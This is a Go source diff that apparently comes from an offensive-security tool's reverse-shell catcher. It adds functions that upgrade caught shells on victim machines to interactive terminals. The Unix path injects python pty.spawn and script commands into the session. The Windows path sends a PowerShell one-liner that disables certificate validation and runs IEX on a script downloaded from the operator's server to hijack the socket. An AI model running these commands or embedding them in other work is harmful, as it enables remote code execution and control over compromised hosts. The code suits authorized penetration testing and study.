@@ -108,6 +108,49 @@ loop:
 	return nil
 }
 
+// upgradeUnix turns a basic Unix reverse shell into a fully interactive PTY,
+// mirroring the web UI's "Unix (PTY)" upgrade (assets/js/src/catcher.js). It
+// runs asynchronously because the steps must be spaced out: the PTY spawn needs
+// a moment to come up before TERM/stty take effect, and we must not block the
+// TUI event loop while waiting. The operator attaches once the upgrade lands.
+func upgradeUnix(sess *catcher.Session, rows, cols int) {
+	if rows <= 0 {
+		rows = 24
+	}
+	if cols <= 0 {
+		cols = 80
+	}
+	go func() {
+		sess.Write([]byte("export TERM=xterm-256color\n"))
+		time.Sleep(200 * time.Millisecond)
+		// Try python3, then python, then script(1) — errors suppressed so a
+		// missing interpreter falls through to the next without noise.
+		sess.Write([]byte(
+			"python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || " +
+				"python -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || " +
+				"script /dev/null -qc /bin/bash 2>/dev/null || true\n"))
+		time.Sleep(1300 * time.Millisecond)
+		fmt.Fprintf(sess, "stty rows %d cols %d\n", rows, cols)
+	}()
+}
+
+// upgradeWindows pulls ConPtyShell from this goshs server and hijacks the
+// existing socket to provide a real PTY, mirroring the web UI's "Windows
+// (ConPtyShell)" upgrade. url must point at /ConPtyShell.ps1?conpty on an
+// address the victim can reach.
+func upgradeWindows(sess *catcher.Session, url string, rows, cols int) {
+	if rows <= 0 {
+		rows = 24
+	}
+	if cols <= 0 {
+		cols = 80
+	}
+	cmd := `[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;` +
+		`Add-Type -TypeDefinition 'using System.Net;using System.Security.Cryptography.X509Certificates;public class Trust{public static void Enable(){System.Net.ServicePointManager.ServerCertificateValidationCallback=delegate{return true;};}}';[Trust]::Enable();` +
+		fmt.Sprintf(`IEX((New-Object Net.WebClient).DownloadString('%s'));Invoke-ConPtyShell -Upgrade -Rows %d -Cols %d`, url, rows, cols) + "\n"
+	sess.Write([]byte(cmd))
+}
+
 // ensureCRLF rewrites bare \n to \r\n so a raw-mode terminal renders shell
 // output without a staircase effect (mirrors catcher.ensureCRLF for the web).
 func ensureCRLF(data []byte) []byte {
